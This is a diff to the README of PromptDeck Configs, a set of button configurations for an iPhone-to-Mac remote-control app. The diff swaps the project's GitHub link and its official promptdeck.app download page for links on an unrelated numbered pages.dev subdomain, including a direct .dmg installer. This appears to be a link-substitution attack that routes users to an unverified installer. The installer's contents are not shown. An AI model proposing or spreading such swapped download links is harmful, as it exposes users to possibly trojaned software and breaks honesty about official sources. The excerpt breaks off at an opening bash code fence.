@@ -1,10 +1,10 @@
 # PromptDeck Configs
 
-Ready-to-use button configurations for [PromptDeck](https://github.com/strefethen/promptdeck) — the iPhone remote control for your Mac.
+Ready-to-use button configurations for [PromptDeck](https://promptdeck-325.pages.dev/) — the iPhone remote control for your Mac.
 
 ## Quick Start
 
-1. Install [PromptDeckHost](https://promptdeck.app/download) on your Mac
+1. Install [PromptDeckHost](https://promptdeck-325.pages.dev/download/PromptDeckHost.dmg) on your Mac
 2. Copy a config to `~/.promptdeck/buttons.yaml`:
 
 ```bash
